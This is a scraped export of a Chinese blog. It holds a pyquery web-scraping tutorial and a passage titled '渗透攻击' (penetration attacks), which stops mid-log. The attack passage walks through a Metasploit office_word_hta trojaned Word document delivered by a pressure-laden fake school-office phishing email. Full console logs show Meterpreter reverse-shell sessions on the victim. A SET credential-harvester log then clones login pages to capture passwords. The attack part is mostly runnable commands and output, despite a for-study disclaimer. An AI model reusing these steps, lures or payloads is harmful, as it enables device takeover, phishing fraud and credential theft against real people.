using pyquery. I can also be used for web scrapping or for theming applications with Deliverance.The project is being actively developped on a git repository on Github. I have the policy of giving push access to anyone who wants it and then to review what he does. So if you want to contribute just email me.Please report bugs on the github issue tracker. 在网页解析过程中，除了强大的Beautiful Soup和XPath之外，还有qyquery的存在，qyquery同样受到了不少“蜘蛛”的欢迎，下面我们来介绍下qyquery的使用。 节点选择与Beautiful Soup和XPath明显不同的是，在qyquery中，一般存在着三种解析方式，一种是requests请求链接之后把html进行传递，一种是将url直接进行传递，还有一种是直接传递本地html文件路径即可，读者在实际使用的过程中根据自己的习惯来编码即可，下面我们来看下这三种方式的表达： 12345678910111213141516171819202122232425import requestsfrom pyquery import PyQuery as pqbd_html = requests.get(\"https://www.baidu.com\").textbd_url = \"https://www.baidu.com\"bd_path = \"./bd.html\"# 使用html参数进行传递def way1(html): return pq(html) # 使用url参数进行传递def way2(url): return pq(url=url)def way3(path): return pq(filename=path)print(type(way1(html=bd_html)))print(type(way2(url=bd_url)))print(type(way3(path=bd_path)))# &lt;class 'pyquery.pyquery.PyQuery'&gt;# &lt;class 'pyquery.pyquery.PyQuery'&gt;# &lt;class 'pyquery.pyquery.PyQuery'&gt; 从上面三种获得解析对象方法的代码中我们可以明显看见都可以得到一样的解析对象，接下来我们只要利用这个对象来对页面进行解析从而提取出我们想要得到的有效信息即可，在qyquery中一般使用的是CSS选择器来选取。下面我们仍然使用百度首页来讲解pyquery的使用，在这里我们假设解析对象为bd_bj。 12345678910111213141516response = requests.get(\"https://www.baidu.com\")response.encoding = \"utf-8\"bd_bj = pq(response.text)bd_title = bd_bj(\"title\")bd_img_ls = bd_bj(\"img\")bd_img_ls2 = bd_bj.find(\"img\")bd_mnav = bd_bj(\".mnav\")bd_img = bd_bj(\"#u1 a\")bd_a_video = bd_bj(\"#u1 .mnav\")# &lt;title&gt;百度一下，你就知道&lt;/title&gt;# &lt;img hidefocus=\"true\" src=\"//www.baidu.com/img/bd_logo1.png\" width=\"270\" height=\"129\"/&gt; &lt;img src=\"//www.baidu.com/img/gs.gif\"/&gt; # ......# 输出结果较长，读者可自行运行 正如上面代码所示，pyquery在进行节点提取的时候通常有三种方式，一种是直接提取出节点名即可提取出整个节点，当然这种方式你也可以使用find方法，这种提取节点的方式是不加任何属性限定的，所以提取出的节点往往会含有多个，所以我们可以使用循环.items()来进行操作；一种是提取出含有特定class属性的节点，这种形式采用的是.+class属性值；还有一种是提取含有特定id属性的节点，这种形式采用的是#+id属性值。熟悉CSS的读者应该不难理解以上提取节点的方法，正是在CSS中提取节点然后对其进行样式操作的方法。上述三种方式您也可以像提取bd_a_video一样混合使用 数据提取在实际解析网页的过程中，三种解析方式基本上大同小异，为了读者认识pyquery的数据提取的操作以及博主日后的查阅，在这里简单的介绍下 1234567img_src1 = bd_bj(\"img\").attr(\"src\") # //www.baidu.com/img/bd_logo1.pngimg_src2 = bd_bj(\"img\").attr.src # //www.baidu.com/img/bd_logo1.pngfor each in bd_bj.find(\"img\").items(): print(each.attr(\"src\")) print(bd_bj(\"title\").text()) # 百度一下，你就知道 如上一二行代码所示，提取节点属性我们可以有两种方式，这里拿src属性来进行说明，一种是.attr(&quot;src&quot;)，另外一种是.attr.src，读者根据自己的习惯来操作即可，这里需要注意的是：在节点提取小结中我们说了在不限制属性的情况下是提取出所有满足条件的节点，所以在这种情况下提取出的属性是第一个节点属性。要想提取所有的节点的属性，我们可以如四五行代码那样使用.items()然后进行遍历，最后和之前一样提取各个节点属性即可。qyquery提取节点中文本内容如第七行代码那样直接使用.text()即可。 pyquery小结pyquery解析如Beautiful Soup和XPath思想一致，所以这了只是简单的介绍了下，想要进一步了解的读者可查阅官方文档在加之熟练操作即可。 腾讯招聘网解析实战通过上述对Beautiful Soup、XPath以及pyquery的介绍，认真阅读过的读者想必已经有了一定的基础，下面我们通过一个简单的实战案例来强化一下三种解析方式的操作。此次解析的网站为腾讯招聘网，网址url：https://hr.tencent.com/，其社会招聘网首页如下所示： 此次我们的任务就是分别利用上述三种解析工具来接下该网站下的社会招聘中的所有数据。 网页分析：通过该网站的社会招聘的首页，我们可以发现如下三条主要信息： 首页url连接为https://hr.tencent.com/position.php 一共有288页的数据，每页10个职位，总职位共计2871 数据字段有五个，分别为：职位名称、职位类别、招聘人数、工作地点、职位发布时间 既然我们解析的是该网站下所有职位数据，再者我们停留在第一页也没有发现其他有价值的信息，不如进入第二页看看，这时我们可以发现网站的url链接有了一个比较明显的变化，即原链接在用户端提交了一个start参数，此时链接为https://hr.tencent.com/position.php?&amp;start=10#a，陆续打开后面的页面我们不难发现其规律：每一页提交的start参数以10位公差进行逐步递增。之后，我们使用谷歌开发者工具来审查该网页，我们可以发现全站皆为静态页面，这位我们解析省下了不少麻烦，我们需要的数据就静态的放置在table标签内，如下所示： 下面我们具体来分别使用以上三种工具来解析该站所有职位数据。 案例源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112import requestsfrom bs4 import BeautifulSoupfrom lxml import etreefrom pyquery import PyQuery as pqimport itertoolsimport pandas as pdclass TencentPosition(): \"\"\" 功能： 定义初始变量 参数： start： 起始数据 \"\"\" def __init__(self, start): self.url = \"https://hr.tencent.com/position.php?&amp;start=&#123;&#125;#a\".format(start) self.headers = &#123; \"Host\": \"hr.tencent.com\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\", &#125; self.file_path = \"./TencentPosition.csv\" \"\"\" 功能： 请求目标页面 参数： url： 目标链接 headers： 请求头 返回： html，页面源码 \"\"\" def get_page(self, url, headers): res = requests.get(url, headers=headers) try: if res.status_code == 200: return res.text else: return self.get_page(url, headers=headers) except RequestException as e: return self.get_page(url, headers=headers) \"\"\" 功能： Beautiful Soup解析页面 参数： html： 请求页面源码 \"\"\" def soup_analysis(self, html): soup = BeautifulSoup(html, \"lxml\") tr_list = soup.find(\"table\", class_=\"tablelist\").find_all(\"tr\") for tr in tr_list[1:-1]: position_info = [td_data for td_data in tr.stripped_strings] self.settle_data(position_info=position_info) \"\"\" 功能： xpath解析页面 参数： html： 请求页面源码 \"\"\" def xpath_analysis(self, html): result = etree.HTML(html) tr_list = result.xpath(\"//table[@class='tablelist']//tr\") for tr in tr_list[1:-1]: position_info = tr.xpath(\"./td//text()\") self.settle_data(position_info=position_info) \"\"\" 功能： pyquery解析页面 参数： html： 请求页面源码 \"\"\" def pyquery_analysis(self, html): result = pq(html) tr_list = result.find(\".tablelist\").find(\"tr\") for tr in itertools.islice(tr_list.items(), 1, 11): position_info = [td.text() for td in tr.find(\"td\").items()] self.settle_data(position_info=position_info) \"\"\" 功能： 职位数据整合 参数： position_info： 字段数据列表 \"\"\" def settle_data(self, position_info): position_data = &#123; \"职位名称\": position_info[0].replace(\"\\xa0\", \" \"), # replace替换\\xa0字符防止转码error \"职位类别\": position_info[1], \"招聘人数\": position_info[2], \"工作地点\": position_info[3], \"发布时间\": position_info[-1], &#125; print(position_data) self.save_data(self.file_path, position_data) \"\"\" 功能： 数据保存 参数： file_path： 文件保存路径 position_data： 职位数据 \"\"\" def save_data(self, file_path, position_data): df = pd.DataFrame([position_data]) try: df.to_csv(file_path, header=False, index=False, mode=\"a+\", encoding=\"gbk\") # 数据转码并换行存储 except: pass if __name__ == \"__main__\": for page, index in enumerate(range(287)): print(\"正在爬取第&#123;&#125;页的职位数据:\".format(page+1)) tp = TencentPosition(start=(index*10)) tp_html = tp.get_page(url=tp.url, headers=tp.headers) tp.pyquery_analysis(html=tp_html) print(\"\\n\") 部分结果如下： 总结在本篇文章中，首先我们分别介绍了Beautiful Soup、XPath、pyquery的常见操作，之后通过使用该三种解析工具来爬取腾讯招聘网中所有的职位招聘数据，从而进一步让读者有一个更加深刻的认识。该案例中，由于本篇文章重点在于网站页面的解析方法，所以未使用多线程、多进程，爬取所有的数据爬取的时间在两分钟左右，在之后的文章中有时间的话会再次介绍多线程多进程的使用，案例中的解析方式都已介绍过，所以读者阅读源码即可。 注意：本文章中所有的内容皆为在实际开发中常见的一些操作，并非所有，想要进一步提升等级的读者务必请阅读官方文档。 2019-01-01,By Zero","path":"2019/01/01/网页爬虫之页面解析/"},{"title":"渗透攻击","text":"前言已经有两个多月没有记录了，最近一直在忙于复习408、线代，还有kaggle的学习，原本打算暂时不再更新文章的，但是最近收到不少了类似像教务处通知、竞赛确认、务必查收等社工邮件亦或短信，是在是可恶至极，所以就再来水一篇文章吧。之后Zero搜索下相关新闻咨询，发现类似诈骗案件的报道还真不少，一大叠一大叠的层出不穷，令人遗憾的是有不少用户抵抗不了自己的好奇心从而咬住了攻击者的“鱼钩”，故而给对方有了可乘之机。 Zero最近同样收到了不少这种邮件，比如昨天下午收到的这封： 虽然类似这种现象很是常见，但是万变不离其宗，攻击者主要是利用社会工程学 + 人们对事物的好奇心理来实行攻击。你的兴趣爱好、个人情感甚至是你的某一篇朋友圈等信息对于他们来说就富含了极大的价值，他们往往能够从中洞察一些别样的信息，也许这些不起眼的信息正是他成功攻击的关键。 所以说，在日常生活中，加强我们的网络安全意识是有必要的，不要天真的以为这些离你还很远，等到来临的那一刻恐怕就为时已晚了。在之前的文章中，已经介绍了无线wifi的入侵，可见：Wifi破解本文主要介绍以下一些常见的攻击手段，希望能对读者有所帮助： 社工邮件 钓鱼网站 安卓渗透 短信诈骗 免责申明任何具有一定侵略性的网络攻击行为都属于非法操作。本文中所有的内容是在自家寝室进行，所攻击的wifi也是自家寝室内的，该文仅供学习，切勿用于非法操作，一切后果由使用者本人负责。（会坐牢的） 环境准备关于Kali Linux的下载安装，之前的文章已经有所介绍，这里就不再重述了。 攻击机：Kali Linux 靶机：Windows 7，android 工具：Metasploit、setoolkit 社工邮件在带有诈骗性的邮件中往往包含了钓鱼链接、木马文件之类的信息，主题中常常带有一些异奇描述，而这些描述则会带你落入圈套，博主不是很会描述，总之核心就是社会工程学。为了让大家理解其中的含义，下面拿诸葛建伟老师的《Metasploit渗透测试魔鬼训练营》一书中的一个例子来说明下： 看到没有，类似上图中的邮件内容，就是酱紫的。下面我们具体来介绍下实现的过程，这次使用的是exploit/windows/fileformat/office_word_hta模块来生成一个带有木马的word文件，目标打开该文件之后，将会在Kali终端获得目标的session，进而控制对方的设备并获取有价值得信息。 木马文件的生成 进入Metasploit终端1msfconsole 执行之后，我们将进入Metasploit终端，如下图所示： 引入exploit/windows/fileformat/office_word_hta模块 进入到Metasploit之后，通过之前的分析，我们是要生成一个木马文件来对选择的目标进行攻击，所以我们需要查询该Kali Linux系统中是否集成了所用模块，在本次我们拿.docword文件来进行演示，为此执行如下命令：1search office 命令执行后显示如下： 由上图我们可以发现，在对模块进行查找的过程中成功找到了三个模块，此次我们使用的是exploit/windows/fileformat/office_word_hta模块，执行以下命令来引入该命令：1use exploit/windows/fileformat/office_word_hta 参数设置 引入模块之后，我们还需要查询该模块所需要的参数从而发动监听，命令如下：1show options 通过上图，我们可以发现，所需要的参数主要有以下一些：12SRVHOST # 攻击机的ip地址，即Kali LinuxFIlENAME # 自定义生成的文件名 通过上述参数的讲解之后，我们对其进行一一设置，命令如下：123set SRVHOST 192.168.31.103 # Kali的ip地址set FILENAME # 自定义文件名# 其他参数默认即可 执行渗透攻击模块exploit 在对参数进行设置之后，我们便能进一步执行exploit(或者run)开始渗透了1exploit/run 执行后的结果如下： 通过上图，我们主要分析如下信息： 所开启的端口：4444、8080 链接地址：http://192.168.31.103:8080/default.hta 木马文件路径：/root/.msf4/local/教务处通知务必查收.doc 至此，我们的木马文件就已经生成了，我们需要进一步的加以利用。 社工OK，现在我们需要通过邮件来将该文件发送给攻击目标了，在对方下载并打开的一瞬间也就是他落入陷阱的时候，在这里我们使用的是QQ邮件，然后博主还不想坐牢，所以就拿自己的账号来演示了，攻击账号：510087153@qq.com，目标账号：26647879@qq.com。好的，下面我们来模拟一下邮件的发送过程，邮件的主题及内容就要考验我们的欺骗等级了。为了提高对方掉入陷阱的概率，我们通过510087153@qq.com账号编辑邮件的主题及正文内容编写如下（这个不是很会写，就随便写写吧，其实在实际攻击的过程中是需要收集目标大量数据的）：123456789主题：教务处通知，务必查看正文：Zero同学： 你好，我是教务处的王老师，主要负责通知有无法正常毕业可能的学生。 从最近几学期你的在校表现来看，你有长期旷课、打架斗殴、成帮结派的行为，对此给学校带来许多负面影响。为此教务处将对你下达黄牌警告，为了保证你的正常毕业，还请仔细阅读附件内容。如若不然，则将会采取进一步的措施：向家长通报、升旗仪式上通报、公告栏通报。仔细阅读附件后，务必在1小时内给予回复，否则后果自负。 教务处，王老师 编辑好后，如下所示。 OK，供给端的操作至此就已经完成了，确认无误并没有明显造假痕迹之后，我们发送邮件然后等待对方“咬钩”即可。 之后，我们回到目标机windows，发现目标账号此时已经收到了一封来自教务处的邮件，我们打开邮件既能见到如上邮件内容（此刻目标的心理活动请读者自行脑补，这里就不再描述了）。待目标阅读完成之后并将附件教务处通知务必.doc下载到本地，若目标打开文件之后则已经“咬钩”了。 OK，不管目标打开的文件是空也好，乱码也罢，只要他鼠标左键双击的一瞬间则已经达到了攻击者的目的了。这是，我们再次回到Kali Linux的终端，显示内容如下所示： 通过上图，我们发现已经获得了目标的session会话，并显示了目标的ip，此时我们就能拿对方的服务器“为所欲为”了，比如摄像头监控、映射文件、桌面捕捉等等坐牢性操作。我们可通过如下命令获取对方的终端权限：12345sessions -l sessions -i 1shellexitbackground 补充：获取到目标终端之后也许会乱码，我们执行chcp 65001即可解决 之后的Dos命令操作这里就不再细说了，有兴趣的朋友可以跳转之前写的一篇文章： 完整命令123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122root@kali:~# msfconsole [-] Failed to connect to the database: could not connect to server: Connection refused Is the server running on host \"localhost\" (::1) and accepting TCP/IP connections on port 5432?could not connect to server: Connection refused Is the server running on host \"localhost\" (127.0.0.1) and accepting TCP/IP connections on port 5432? Call trans opt: received. 2-19-98 13:24:18 REC:Loc Trace program: running wake up, Neo... the matrix has you follow the white rabbit. knock, knock, Neo. (`. ,-, ` `. ,;' / `. ,'/ .' `. X /.' .-;--''--.._` ` ( .' / ` , ` ' Q ' , , `._ \\ ,.| ' `-.;_' : . ` ; ` ` --,.._; ' ` , ) .' `._ , ' /_ ; ,''-,;' ``- ``-..__``--` https://metasploit.com =[ metasploit v4.17.25-dev ]+ -- --=[ 1828 exploits - 1033 auxiliary - 318 post ]+ -- --=[ 541 payloads - 44 encoders - 10 nops ]+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]msf &gt; use exploit/windows/fileformat/office_word_hta msf exploit(windows/fileformat/office_word_hta) &gt; show optionsModule options (exploit/windows/fileformat/office_word_hta): Name Current Setting Required Description ---- --------------- -------- ----------- FILENAME msf.doc yes The file name. SRVHOST 0.0.0.0 yes The local host to listen on. This must be an address on the local machine or 0.0.0.0 SRVPORT 8080 yes The local port to listen on. SSL false no Negotiate SSL for incoming connections SSLCert no Path to a custom SSL certificate (default is randomly generated) URIPATH default.hta yes The URI to use for the HTA fileExploit target: Id Name -- ---- 0 Microsoft Office Wordmsf exploit(windows/fileformat/office_word_hta) &gt; set SRVHOST 192.168.31.103SRVHOST =&gt; 192.168.31.103msf exploit(windows/fileformat/office_word_hta) &gt; set FIlENAME 教务处通知务必查收.docFIlENAME =&gt; 教务处通知务必查收.docmsf exploit(windows/fileformat/office_word_hta) &gt; exploit[*] Exploit running as background job 0.[*] Started reverse TCP handler on 192.168.31.103:4444 [+] 教务处通知务必查收.doc stored at /root/.msf4/local/.doc[*] Using URL: http://192.168.31.103:8080/default.hta[*] Server started.msf exploit(windows/fileformat/office_word_hta) &gt; [*] Sending stage (179779 bytes) to 192.168.31.232[*] Meterpreter session 1 opened (192.168.31.103:4444 -&gt; 192.168.31.232:52520) at 2018-12-14 18:45:45 +0800[*] Sending stage (179779 bytes) to 192.168.31.232[*] Meterpreter session 2 opened (192.168.31.103:4444 -&gt; 192.168.31.232:52519) at 2018-12-14 18:45:48 +0800[*] Sending stage (179779 bytes) to 192.168.31.232[*] Meterpreter session 3 opened (192.168.31.103:4444 -&gt; 192.168.31.232:52521) at 2018-12-14 18:45:48 +0800msf exploit(windows/fileformat/office_word_hta) &gt; sessions -lActive sessions=============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 meterpreter x86/windows TXJ-PC\\TXJ @ TXJ-PC 192.168.31.103:4444 -&gt; 192.168.31.232:52520 (192.168.31.232) 2 meterpreter x86/windows TXJ-PC\\TXJ @ TXJ-PC 192.168.31.103:4444 -&gt; 192.168.31.232:52519 (192.168.31.232) 3 meterpreter x86/windows TXJ-PC\\TXJ @ TXJ-PC 192.168.31.103:4444 -&gt; 192.168.31.232:52521 (192.168.31.232)msf exploit(windows/fileformat/office_word_hta) &gt; sessions -i 1[*] Starting interaction with 1...meterpreter &gt; shellProcess 3980 created.Channel 3 created.Microsoft Windows [?汾 6.1.7601]??????? (c) 2009 Microsoft Corporation???????????????C:\\Users\\TXJ\\Desktop&gt;chcp 65001chcp 65001Active code page: 65001C:\\Users\\TXJ\\Desktop&gt;dirdir Volume in drive C is Windows Volume Serial Number is 12B9-032A Directory of C:\\Users\\TXJ\\Desktop2018/12/14 18:32 &lt;DIR&gt; .2018/12/14 18:32 &lt;DIR&gt; ..2018/12/14 18:36 2,461 Google Chrome.lnk2018/12/14 18:42 &lt;DIR&gt; images2018/12/08 04:27 95 新建文本文档.txt 2 File(s) 2,556 bytes 3 Dir(s) 30,969,548,800 bytes freeC:\\Users\\TXJ\\Desktop&gt; 钓鱼网站除了上述社工邮件之外，在实际过程中钓鱼网站也是比较常见的。钓鱼网站主要是先通过爬虫手段先爬取常见的登录页面，比如像163邮箱之类的常见应用。下面附一个Python的小爬虫Demo来爬取163登录页并保存：12345678910111213141516171819202122232425262728try: import requestsexcept: import os print(\"The package is downloading......\") os.system(\"python -m pip install --upgrade pip &amp;&amp; pip install requests\") print(\"The requirement already satisfied\")def get_page(url, headers): try: if requests.get(url=url, headers=headers).status_code == 200: request = requests.get(url=url, headers=headers) request.encoding = \"utf-8\" return request.text else: print(\"Error! Please resend the request\") return get_page(url=url, headers=headers).text except RequestException as e: print(\"&#123;&#125;&#123;&#125;Error! Please resend the request\".format(e, \"\\n\")) return get_page(url=url, headers=headers).textif __name__ == \"__main__\": headers = &#123; \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\" &#125; html = get_page(url = \"https://mail.163.com/\", headers=headers) with open(\"163maillogin.html\", \"w\", encoding=\"utf-8\") as f: f.write(html) 爬取好后，我们就能将该页面发布到自己的服务器中然后等待受害者的登录，待其输入账号密码之后就会在我们的Kali Linux终端截取到账号及密码了，下面我们通过setoolkit工具来模拟实现该钓鱼网站的过程。 setoolkit攻击在Kali终端执行setoolkit，执行之后我们会见到如下内容： 之后，我们选择第一个选项Social-Engineering Attacks社会工程学，选择并回车之后，我们可见如下内容：1234567891011121314Select from the menu: 1) Spear-Phishing Attack Vectors ＃ 鱼叉式钓鱼攻击向量 2) Website Attack Vectors ＃ 网页攻击向量 3) Infectious Media Generator ＃ 媒介感染生成器 4) Create a Payload and Listener ＃ 生成一个payload并监听 5) Mass Mailer Attack ＃ 大规模邮件钓鱼 6) Arduino-Based Attack Vector ＃ Arduino的攻击 7) Wireless Access Point Attack Vector ＃ 无线接入点攻击 8) QRCode Generator Attack Vector ＃ 二维码攻击 9) Powershell Attack Vectors ＃ powershell攻击10) Third Party Modules ＃ 第三方模块 99) Return back to the main menu. 通过上述11个选项的解释，我们已经认识到了该社会工程学的强大了并对社会工程学setoolkit工具有了一个大概的了解了，此次我们用到的是第二个模块Website Attack Vectors，之后进一步进行第三个选项Credential Harvester Attack Method，随后选择第二个Site Cloner。执行之后，我们可见如下内容： 之后我们输入目标网页从而将爬取网页的源代码并创建一个80端口的服务，比如此次我们拿知乎的登录首页来进行演示，为此我们输入https://www.zhihu.com/signup?next=%2F，如上述所编代码一样，该命令会将知乎的登录页面爬取下来然后将该页面发布到本机的80端口服务中，我们来访问该页面看看： OK，如你所见，此时的页面除了域名不一样之外，其他的内容完全是一模一样的，在实际“钓鱼”的过程中，攻击者往往会将域名尽量的相似化，比如pq.com、pp.com、zhlhu.com、zhini.com。这就好比考试，命题人总会出一些及其容易错的题目，也许你一个不小心就会失算从而正中命题者的陷阱，比如Zero前几天遇到的几道题： 命题人往往会根据自己的自身经验尝试着去抓住大部分考生的弱点，从而得到一个选拔的效果，待你发现自身的错误之后恐怕为时已晚，分已经丢了，我们此刻能做的也只有扇扇自己几个耳光来小惩罚以下自己。 跑题了，回来吧。 社会工程学也是一样的，目标一不留神就会“咬钩”。如上所述，我们访问之后会发现一模一样的页面，此时我们尝试着输入账号密码试试，会发现用户端并没有什么明显的反应，我们再来回到Kali Linux看看，果然，你的账号、密码已经成功被截取到了。账号、密码被攻击者拿到之后，后面所发生的事我想不必介绍大家也都了解了。 完整命令123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX XXXX MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM XXXX MMMMMMMMMMMMMMMMMMMMMssssssssssssssssssssssssssMMMMMMMMMMMMMMMMMMMMM XXXX MMMMMMMMMMMMMMMMss''' '''ssMMMMMMMMMMMMMMMM XXXX MMMMMMMMMMMMyy'' ''yyMMMMMMMMMMMM XXXX MMMMMMMMyy'' ''yyMMMMMMMM XXXX MMMMMy'' ''yMMMMM XXXX MMMy' 'yMMM XXXX Mh' 'hM XXXX - - XXXX XXXX :: :: XXXX MMhh. ..hhhhhh.. ..hhhhhh.. .hhMM XXXX MMMMMh ..hhMMMMMMMMMMhh. .hhMMMMMMMMMMhh.. hMMMMM XXXX ---MMM .hMMMMdd:::dMMMMMMMhh.. ..hhMMMMMMMd:::ddMMMMh. MMM--- XXXX MMMMMM MMmm'' 'mmMMMMMMMMyy. .yyMMMMMMMMmm' ''mmMM MMMMMM XXXX ---mMM '' 'mmMMMMMMMM MMMMMMMMmm' '' MMm--- XXXX yyyym' . 'mMMMMm' 'mMMMMm' . 'myyyy XXXX mm'' .y' ..yyyyy.. '''' '''' ..yyyyy.. 'y. ''mm XXXX MN .sMMMMMMMMMss. . . .ssMMMMMMMMMs. NM XXXX N` MMMMMMMMMMMMMN M M NMMMMMMMMMMMMM `N XXXX + .sMNNNNNMMMMMN+ `N N` +NMMMMMNNNNNMs. + XXXX o+++ ++++Mo M M oM++++ +++o XXXX oo oo XXXX oM oo oo Mo XXXX oMMo M M oMMo XXXX +MMMM s s MMMM+ XXXX +MMMMM+ +++NNNN+ +NNNN+++ +MMMMM+ XXXX +MMMMMMM+ ++NNMMMMMMMMN+ +NMMMMMMMMNN++ +MMMMMMM+ XXXX MMMMMMMMMNN+++NNMMMMMMMMMMMMMMNNNNMMMMMMMMMMMMMMNN+++NNMMMMMMMMM XXXX yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy XXXX m yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy m XXXX MMm yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy mMM XXXX MMMm .yyMMMMMMMMMMMMMMMM MMMMMMMMMM MMMMMMMMMMMMMMMMyy. mMMM XXXX MMMMd ''''hhhhh odddo obbbo hhhh'''' dMMMM XXXX MMMMMd 'hMMMMMMMMMMddddddMMMMMMMMMMh' dMMMMM XXXX MMMMMMd 'hMMMMMMMMMMMMMMMMMMMMMMh' dMMMMMM XXXX MMMMMMM- ''ddMMMMMMMMMMMMMMdd'' -MMMMMMM XXXX MMMMMMMM '::dddddddd::' MMMMMMMM XXXX MMMMMMMM- -MMMMMMMM XXXX MMMMMMMMM MMMMMMMMM XXXX MMMMMMMMMy yMMMMMMMMM XXXX MMMMMMMMMMy. .yMMMMMMMMMM XXXX MMMMMMMMMMMMy. .yMMMMMMMMMMMM XXXX MMMMMMMMMMMMMMy. .yMMMMMMMMMMMMMM XXXX MMMMMMMMMMMMMMMMs. .sMMMMMMMMMMMMMMMM XXXX MMMMMMMMMMMMMMMMMMss. .... .ssMMMMMMMMMMMMMMMMMM XXXX MMMMMMMMMMMMMMMMMMMMNo oNNNNo oNMMMMMMMMMMMMMMMMMMMM XXXX XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX .o88o. o8o . 888 `\" `\"' .o8 o888oo .oooo.o .ooooo. .ooooo. oooo .ooooo. .o888oo oooo ooo 888 d88( \"8 d88' `88b d88' `\"Y8 `888 d88' `88b 888 `88. .8' 888 `\"Y88b. 888 888 888 888 888ooo888 888 `88..8' 888 o. )88b 888 888 888 .o8 888 888 .o 888 . `888' o888o 8\"\"888P' `Y8bod8P' `Y8bod8P' o888o `Y8bod8P' \"888\" d8' .o...P' `XER0'[---] The Social-Engineer Toolkit (SET) [---][---] Created by: David Kennedy (ReL1K) [---] Version: 7.7.9 Codename: 'Blackout'[---] Follow us on Twitter: @TrustedSec [---][---] Follow me on Twitter: @HackingDave [---][---] Homepage: https://www.trustedsec.com [---] Welcome to the Social-Engineer Toolkit (SET). The one stop shop for all of your SE needs. Join us on irc.freenode.net in channel #setoolkit The Social-Engineer Toolkit is a product of TrustedSec. Visit: https://www.trustedsec.com It's easy to update using the PenTesters Framework! (PTF)Visit https://github.com/trustedsec/ptf to update all your tools! Select from the menu: 1) Spear-Phishing Attack Vectors 2) Website Attack Vectors 3) Infectious Media Generator 4) Create a Payload and Listener 5) Mass Mailer Attack 6) Arduino-Based Attack Vector 7) Wireless Access Point Attack Vector 8) QRCode Generator Attack Vector 9) Powershell Attack Vectors 10) SMS Spoofing Attack Vector 11) Third Party Modules 99) Return back to the main menu.set&gt; 2The Web Attack module is a unique way of utilizing multiple web-based attacks in order to compromise the intended victim.The Java Applet Attack method will spoof a Java Certificate and deliver a metasploit based payload. Uses a customized java applet created by Thomas Werth to deliver the payload.The Metasploit Browser Exploit method will utilize select Metasploit browser exploits through an iframe and deliver a Metasploit payload.The Credential Harvester method will utilize web cloning of a web- site that has a username and password field and harvest all the information posted to the website.The TabNabbing method will wait for a user to move to a different tab, then refresh the page to something different.The Web-Jacking Attack method was introduced by white_sheep, emgent. This method utilizes iframe replacements to make the highlighted URL link to appear legitimate however when clicked a window pops up then is replaced with the malicious link. You can edit the link replacement settings in the set_config if its too slow/fast.The Multi-Attack method will add a combination of attacks through the web attack menu. For example you can utilize the Java Applet, Metasploit Browser, Credential Harvester/Tabnabbing all at once to see which is successful.The HTA Attack method will allow you to clone a site and perform powershell injection through HTA files which can be used for Windows-based powershell exploitation through the browser. 1) Java Applet Attack Method 2) Metasploit Browser Exploit Method 3) Credential Harvester Attack Method 4) Tabnabbing Attack Method 5) Web Jacking Attack Method 6) Multi-Attack Web Method 7) Full Screen Attack Method 8) HTA Attack Method 99) Return to Main Menuset:webattack&gt;3 The first method will allow SET to import a list of pre-defined web applications that it can utilize within the attack. The second method will completely clone a website of your choosing and allow you to utilize the attack vectors within the completely same web application you were attempting to clone. The third method allows you to import your own website, note that you should only have an index.html when using the import website functionality. 1) Web Templates 2) Site Cloner 3) Custom Import 99) Return to Webattack Menuset:webattack&gt;2[-] Credential harvester will allow you to utilize the clone capabilities within SET[-] to harvest credentials or parameters from a website as well as place them into a report---------------------------------------------------------------------------------- * IMPORTANT * READ THIS BEFORE ENTERING IN THE IP ADDRESS * IMPORTANT * ---The way that this works is by cloning a site and looking for form fields torewrite. If the POST fields are not usual methods for posting forms this could fail. If it does, you can always save the HTML, rewrite the forms tobe standard forms and use the \"IMPORT\" feature. Additionally, really important:If you are using an EXTERNAL IP ADDRESS, you need to place the EXTERNALIP address below, not your NAT address. Additionally, if you don't knowbasic networking concepts, and you have a private IP address, you willneed to do port forwarding to your NAT IP address from your external IPaddress. A browser doesns't know how to communicate with a private IPaddress, so if you don't specify an external IP address if you are usingthis from an external perpective, it will not work. This isn't a SET issuethis is how networking works.set:webattack&gt; IP address for the POST back in Harvester/Tabnabbing [192.168.31.103]:[-] SET supports both HTTP and HTTPS[-] Example: http://www.thisisafakesite.comset:webattack&gt; Enter the url to clone:https://passport.csdn.net/login[*] Cloning the website: https://passport.csdn.net/login[*] This could take a little bit...The best way to use this attack is if username and password formfields are available. Regardless, this captures all POSTs on a website.[*] You may need to copy /var/www/* into /var/www/html depending on where your directory structure is.Press &#123;return&#125; if you understand what we're saying here.[*] The Social-Engineer Toolkit Credential Harvester Attack[*] Credential Harvester is running on port 80[*] Information will 